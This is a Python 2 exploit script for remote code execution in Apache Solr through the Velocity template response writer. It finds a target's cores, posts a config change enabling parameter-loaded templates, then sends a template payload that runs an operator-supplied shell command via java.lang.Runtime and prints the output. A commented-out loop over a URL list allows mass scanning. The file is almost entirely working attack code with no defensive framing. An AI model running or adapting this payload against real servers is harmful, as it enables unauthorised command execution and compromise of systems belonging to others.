#coding=utf-8

import requests
import sys
import json

banner = '''


                            _             _____       _        _____   _____ ______ 
     /\                    | |           / ____|     | |      |  __ \ / ____|  ____|
    /  \   _ __   __ _  ___| |__   ___  | (___   ___ | |_ __  | |__) | |    | |__   
   / /\ \ | '_ \ / _` |/ __| '_ \ / _ \  \___ \ / _ \| | '__| |  _  /| |    |  __|  
  / ____ \| |_) | (_| | (__| | | |  __/  ____) | (_) | | |    | | \ \| |____| |____ 
 /_/    \_\ .__/ \__,_|\___|_| |_|\___| |_____/ \___/|_|_|    |_|  \_\\_____|______|
          | |                                                                       
          |_|                                                                       

                   Apache Solr Velocity模板远程代码执行

                         2019-10-30  17:30

                         python By Jas502n



>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
'''
print banner

def get_code_name(url):
    if url[-1] == '/':
        url = url[:-1].split('\n')[0]
    else:
        url = url.split('\n')[0]
        
    core_url = url + '/solr/admin/cores?indexInfo=false&wt=json'
    print '[+] Querying Core Name: '+core_url,'\n'
    proxies = {"http":"http://127.0.0.1:8080"}
    try:
        # r = requests.get(core_url,proxies=proxies)
        r = requests.get(core_url)
        if r.status_code == 200 and 'responseHeader' in r.content and 'status' in r.content:
            json_str = json.loads(r.content)
            for i in json_str['status']:
                core_name_url = url + '/solr/' + i + '/config'
                print core_name_url
                update_queryresponsewriter(core_name_url)
        else:
            print "No core name exit!"
    except:
        pass
def update_queryresponsewriter(core_name_url):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Content-Length': '259',
    'Connection': 'close'
    }
    payload = '''
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }'''
    proxies = {"http":"http://127.0.0.1:8080"}
    r = requests.post(core_name_url,headers=headers,data=payload)
    # r = requests.post(core_name_url,headers=headers,data=payload,proxies=proxies)
    if r.status_code == 200 and 'responseHeader' in r.content:
        print "[+] maybe enable Successful!"
        exp_url = core_name_url[:-7]
        cmd = 'whoami'
        cmd = sys.argv[2]

        send_exp(exp_url,cmd)
    else:
        print "[+] Enable Fail!\n"
def send_exp(exp_url,cmd):
    exp_url = exp_url + r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + cmd + r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    proxies = {"http":"http://127.0.0.1:8080"}
    r = requests.get(exp_url)
    # r = requests.get(exp_url,proxies=proxies)
    if r.status_code == 400 or r.status_code == 500  or r.status_code ==200 and len(r.content) >0:
        print ">>> [+] Exp Send Successful! <<<"
        print "____________________________________________________________"
        print '\n',exp_url,'\n'
        print '>>>>>>>\n',r.content
    else:
        print "[+] EXP No Send Successful!\n"
if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.exit("\n [+] Usage:  python %s http://x.x.x.x:8983  command\n" % sys.argv[0])
    else:
        # url = "http://192.168.5.86:8983"
        url = sys.argv[1]
        get_code_name(url)
    
        # 批量
        # f = open('url.txt','rb')
        # for i in f.readlines():
        #     url = i.split('\r\n')[0]
        #     get_code_name(url)

    
    


